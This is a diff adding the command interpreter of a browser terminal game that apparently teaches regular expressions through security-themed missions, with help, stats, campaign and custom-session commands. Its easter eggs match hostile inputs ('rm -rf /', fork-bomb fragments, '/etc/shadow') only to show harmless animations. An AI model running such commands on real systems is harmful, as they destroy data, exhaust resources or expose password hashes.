+
+// =============================================================================
+// 8. INTERPRÉTEUR DE COMMANDES SHELL PRINCIPAL
+// =============================================================================
+function startCampaign(startAt) {
+  const s = startAt || profile.campaignUnlocked || 1;
+  state.playlist = [];
+  for (let i = s; i <= TOTAL_MISSIONS; i++) state.playlist.push(i);
+  state.mode = "CAMPAIGN";
+  state.stepIdx = 0;
+  state.sessionScore = 0;
+  state.active = true;
+  state.wizardStep = 0;
+  printMission();
+}
+
+function onPromptSubmit(e) {
+  e.preventDefault();
+  if (state.busy) return;
+  const raw = inpEl.value;
+  inpEl.value = "";
+  handleInput(raw);
+}
+
+function handleInput(rawInput) {
+  const cmd = rawInput.trim();
+  printHtml(`${promptLbl.innerHTML} ${esc(cmd)}`);
+
+  if (state.awaitingNext && cmd === "") {
+    state.stepIdx++;
+    printMission();
+    return;
+  }
+
+  if (!cmd) return;
+  cmdHistory.unshift(cmd);
+  histIdx = -1;
+
+  if (state.wizardStep > 0) {
+    handleCustomWizard(cmd);
+    return;
+  }
+
+  const parts = cmd.split(/\s+/);
+  const base = parts[0].toLowerCase();
+  const arg = parts.slice(1).join(" ");
+
+  if (base === "help" || base === "man") {
+    printText("");
+    printHtml(`  <span class="c-cyan bold">COMMANDES DISPONIBLES :</span>`);
+    printHtml(`    <span class="c-green bold">start</span> / <span class="c-green bold">camp</span>       : Lancer la campagne au niveau débloqué (${profile.campaignUnlocked}/${TOTAL_MISSIONS})`);
+    printHtml(`    <span class="c-green bold">goto &lt;1-${TOTAL_MISSIONS}&gt;</span>        : Aller directement à une mission précise`);
+    printHtml(`    <span class="c-green bold">custom</span>             : Configurer une session aléatoire (difficulté N1..N5, thème, nombre)`);
+    printHtml(`    <span class="c-green bold">xray &lt;regex&gt;</span>       : Inspecter les sous-chaînes matchées et les groupes (\\1, \\2)`);
+    printHtml(`    <span class="c-green bold">stats</span> / <span class="c-green bold">unlocks</span>    : Voir ton grade, tes thèmes débloqués et tes badges`);
+    printHtml(`    <span class="c-green bold">board</span> / <span class="c-green bold">submit</span>     : Voir le Leaderboard ou publier ton score`);
+    printHtml(`    <span class="c-green bold">nick &lt;pseudo&gt;</span>      : Changer ton pseudo (actuel : <span class="c-cyan">${esc(profile.pseudo)}</span>)`);
+    printHtml(`    <span class="c-green bold">memo</span>               : Afficher le manuel complet RegEx / PCRE`);
+    printHtml(`    <span class="c-green bold">theme &lt;nom&gt;</span>        : Changer de thème (${Object.keys(THEMES).join(', ')})`);
+    printHtml(`    <span class="c-green bold">size &lt;12-20&gt;</span>       : Changer la taille de police (ex: size 16)`);
+    printHtml(`    <span class="c-green bold">clear</span>              : Nettoyer le terminal et réafficher la bannière`);
+    printText("");
+    return;
+  }
+
+  if (base === "clear" || base === "cls" || base === "banner") {
+    outEl.innerHTML = "";
+    drawAsciiHeader();
+    if (state.active) printMission();
+    return;
+  }
+
+  if (base === "theme") {
+    if (!arg || !setTheme(arg.toLowerCase())) {
+      printHtml(`  Thèmes disponibles : <span class="c-cyan">${Object.keys(THEMES).join(', ')}</span>`);
+    }
+    return;
+  }
+
+  if (base === "size") {
+    const sz = parseInt(arg, 10);
+    if (!sz || sz < 11 || sz > 24) {
+      printHtml(`  Usage : <span class="c-cyan">size &lt;12-20&gt;</span>`);
+      return;
+    }
+    setFontSize(`${sz}px`);
+    return;
+  }
+
+  // --- Easter Eggs Cyber ---
+  if (cmd === "rm -rf") {
+    printHtml(`<span class="c-red">rm: permission denied</span>`);
+    return;
+  }
+  if (cmd.startsWith("rm -rf /")) {
+    runReaperEasterEgg();
+    return;
+  }
+  if (cmd.includes(":(){") || cmd.includes(":|:&")) {
+    runForkBombEasterEgg();
+    return;
+  }
+  if (base === "joshua" || base === "wargames") {
+    runWoprEasterEgg();
+    return;
+  }
+  if ((base === "grep" && cmd.toLowerCase().includes("flag")) || cmd.includes("/etc/shadow")) {
+    triggerSecretFlag();
+    return;
+  }
+
+  if (base === "xray" || base === "test") {
+    if (!arg) { printHtml(`  Usage : <span class="c-cyan">xray &lt;ta_regex&gt;</span>`); return; }
+    runXrayInspector(arg);
+    return;
+  }
+
+  if (base === "memo") { showMemo(); return; }
+
+  if (base === "tree" || base === "stats" || base === "profil" || base === "unlocks") {
+    const rk = getOperatorRank();
+    printText("");
+    printHtml(`  <span class="c-cyan bold">Profil Opérateur : ${esc(profile.pseudo)}</span> <span class="badge-theme">${esc(rk.title)}</span>`);
+    printHtml(`  ├── <span class="bold">Progression Campagne :</span> Niveau ${profile.campaignUnlocked}/${TOTAL_MISSIONS}`);
+    printHtml(`  ├── <span class="bold">Missions Maîtrisées  :</span> <span class="c-green bold">${profile.masteredIds.length}/${TOTAL_MISSIONS}</span>`);
+    printHtml(`  ├── <span class="bold">Meilleure Série      :</span> <span class="c-yellow bold">🔥 ${profile.bestStreak} sans faute</span> (Actuelle : ${profile.streak})`);
+    printHtml(`  ├── <span class="bold">Score Cumulé         :</span> <span class="c-yellow bold">${profile.totalScore} pts</span> (Record session : ${profile.bestScore} pts)`);
+    printHtml(`  ├── <span class="bold">Hauts Faits (Badges) :</span> ${profile.badges.length ? profile.badges.map(b => `<span class="c-cyan bold">[🏅 ${esc(b)}]</span>`).join(' ') : '<span class="c-dim">Aucun pour le moment</span>'}`);
+    printHtml(`  ├── <span class="bold">Thèmes Prestige      :</span>`);
+    for (const [k, v] of Object.entries(THEMES)) {
+      if (!v.locked) continue;
+      const st = isThemeUnlocked(k) ? `<span class="c-green bold">[🔓 DÉBLOQUÉ : theme ${esc(k)}]</span>` : `<span class="c-dim">[🔒 Verrouillé : ${esc(v.unlockHint)}]</span>`;
+      printHtml(`  │   ├── <span class="bold">${esc(v.label.padEnd(26))}</span> ${st}`);
+    }
+    printHtml(`  └── <span class="bold">Architecture des 5 Paliers RegEx :</span>`);
+    printHtml(`      ├── <span class="c-cyan">[01..09]</span> Tier 1 : Technicien N1 — Ancres ^ $, Échappement \\. &amp; Quantifieurs`);
+    printHtml(`      ├── <span class="c-cyan">[10..18]</span> Tier 2 : Admin Système N2 — Classes \\d \\w \\s, Bornes \\b &amp; {n,m}`);
+    printHtml(`      ├── <span class="c-cyan">[19..27]</span> Tier 3 : Analyste SOC N3 — Groupes, Alternation | &amp; Plages Réseau`);
+    printHtml(`      ├── <span class="c-cyan">[28..36]</span> Tier 4 : Expert Forensics N4 — Références Arrières \\1 \\2 &amp; Corrélation`);
+    printHtml(`      └── <span class="c-cyan">[37..48]</span> Tier 5 : Architecte SecOps N5 — Lookarounds (?=...) (?!...) &amp; SIEM`);
+    printText("");
+    return;
+  }
+
+  if (base === "nick") {
+    if (!arg) { printHtml(`  Usage : <span class="c-cyan">nick &lt;ton_pseudo&gt;</span>`); return; }
+    profile.pseudo = arg.replace(/[^a-zA-Z0-9_-]/g, "").slice(0, 20) || "soc";
+    saveProfile();
+    printHtml(`  <span class="c-green">[✓]</span> Pseudo défini sur : <span class="c-cyan bold">${esc(profile.pseudo)}</span>`);
+    return;
+  }
+
+  if (base === "board" || base === "leaderboard") { showLeaderboard(); return; }
+  if (base === "submit") { submitScoreToBoard(); return; }
+
+  if (base === "start" || base === "camp" || base === "campagne") {
+    startCampaign(parseInt(arg, 10) || profile.campaignUnlocked);
+    return;
+  }
+
+  if (base === "goto" || base === "cd") {
+    const n = parseInt(arg, 10);
+    if (!n || n < 1 || n > TOTAL_MISSIONS) {
+      printHtml(`  Usage : <span class="c-cyan">goto &lt;1-${TOTAL_MISSIONS}&gt;</span>`);
+      return;
+    }
+    startCampaign(n);
+    return;
+  }
+
+  if (base === "custom") {
+    state.active = false;
+    state.wizardStep = 1;
+    updatePromptLabel();
+    printText("");
+    printHtml(`  <span class="c-cyan bold">⚙️ CONFIGURATION D'OPÉRATION SUR-MESURE</span>`);
+    printHtml(`  Étape 1/3 — Difficulté [<span class="c-yellow">1</span>=N1, <span class="c-yellow">2</span>=N2, <span class="c-yellow">3</span>=N3, <span class="c-yellow">4</span>=N4, <span class="c-yellow">5</span>=N5, <span class="c-yellow">ALL</span>=Mixte] (défaut: ALL) :`);
+    return;
+  }
+
+  if (state.active) {
+    const m = MISSIONS.find(x => x.id === state.playlist[state.stepIdx]);
+    if (base === "exit" || base === "quit" || base === "menu") {
+      state.active = false;
+      state.awaitingNext = false;
+      updatePromptLabel();
+      printHtml(`  <span class="c-dim">Session mise en pause. Tape 'start' pour reprendre ou 'help'.</span>`);
+      return;
+    }
+    if (base === "ls") { printMission(); return; }
+    if (base === "hint" || base === "indice") {
+      if (state.usedHint === 0) state.usedHint = 1;
+      printHtml(`  <span class="c-yellow bold">💡 [INDICE SIEM] :</span> ${esc(m.hint)}`);
+      return;
+    }
+    if (base === "sol" || base === "solution") {
+      state.usedHint = 2;
+      printHtml(`  <span class="c-magenta bold">🔑 [SOLUTION CANONIQUE] :</span> <span class="bold">${esc(m.solution)}</span>`);
+      return;
+    }
+    if (base === "skip" || base === "next") {
+      profile.streak = 0;
+      saveProfile();
+      state.stepIdx++;
+      printMission();
+      return;
+    }
+    if (state.awaitingNext) {
+      state.stepIdx++;
+      printMission();
+      return;
+    }
+    evaluateRegexAttempt(cmd);
+    return;
+  }
+
+  printHtml(`  <span class="c-red">bash: ${esc(base)}: commande introuvable.</span> Tape <span class="c-cyan bold">help</span> ou <span class="c-cyan bold">start</span>.`);
+}
+
+function handleCustomWizard(input) {
+  const val = input.trim().toUpperCase();
+  if (val === "EXIT" || val === "QUIT") {
+    state.wizardStep = 0;
+    updatePromptLabel();
+    printHtml(`  <span class="c-dim">Configuration annulée.</span>`);
+    return;
+  }
+  if (state.wizardStep === 1) {
+    state.wizardData.diff = ["1", "2", "3", "4", "5"].includes(val) ? Number(val) : "ALL";
+    state.wizardStep = 2;
+    printHtml(`  Étape 2/3 — Thème [<span class="c-yellow">NET</span>, <span class="c-yellow">SYS</span>, <span class="c-yellow">SEC</span>, <span class="c-yellow">ALL</span>] (défaut: ALL) :`);
+    return;
+  }
+  if (state.wizardStep === 2) {
+    state.wizardData.theme = ["NET", "SYS", "SEC"].includes(val) ? val : "ALL";
+    state.wizardStep = 3;
+    printHtml(`  Étape 3/3 — Nombre de missions à tirer au sort [<span class="c-yellow">1-${TOTAL_MISSIONS}</span>] (défaut: 5) :`);
+    return;
+  }
+  if (state.wizardStep === 3) {
+    const count = parseInt(val, 10) || 5;
+    const pool = MISSIONS.filter(m =>
+      (state.wizardData.diff === "ALL" || m.diff === state.wizardData.diff) &&
+      (state.wizardData.theme === "ALL" || m.theme === state.wizardData.theme)
+    ).map(m => m.id);
+
+    for (let i = pool.length - 1; i > 0; i--) {
+      const r = Math.floor(Math.random() * (i + 1));
+      [pool[i], pool[r]] = [pool[r], pool[i]];
+    }
+
+    state.wizardStep = 0;
+    state.playlist = pool.slice(0, Math.min(count, pool.length));
+    state.mode = "CUSTOM";
+    state.stepIdx = 0;
+    state.sessionScore = 0;
+    state.active = true;
+    printMission();
+  }
+}
+
+// Historique flèches Haut / Bas
+inpEl.addEventListener('keydown', (e) => {
+  if (e.key === 'ArrowUp') {
+    if (histIdx + 1 < cmdHistory.length) {
+      histIdx++;
+      inpEl.value = cmdHistory[histIdx];
+      e.preventDefault();
+    }
+  } else if (e.key === 'ArrowDown') {
+    if (histIdx > 0) {
+      histIdx--;
+      inpEl.value = cmdHistory[histIdx];
+      e.preventDefault();
+    } else if (histIdx === 0) {
+      histIdx = -1;
+      inpEl.value = "";
+      e.preventDefault();
+    }
+  }
+});
+
+// Initialisation au démarrage
+loadProfile();
+drawAsciiHeader();
+printText("");
+printHtml(`  Bienvenue sur <span class="c-cyan bold">REGEX-OPS</span>. Moteur : <span class="c-green">PCRE / ERE (Rayons-X &amp; Backreferences actifs)</span>`);
+printHtml(`  • Tape <span class="c-cyan bold">start</span> (ou clique sur <span class="c-cyan">[1:Campagne]</span>) pour lancer la Mission #${String(profile.campaignUnlocked).padStart(2, '0')}/${TOTAL_MISSIONS}.`);
+printHtml(`  • Tape <span class="c-cyan bold">stats</span> pour voir les <span class="c-yellow bold">5 Thèmes Prestige</span> et <span class="c-yellow bold">Badges</span> à débloquer (Overclock, Streak, Golf...).`);
+printText("");
+</script>
+</body>
+</html>
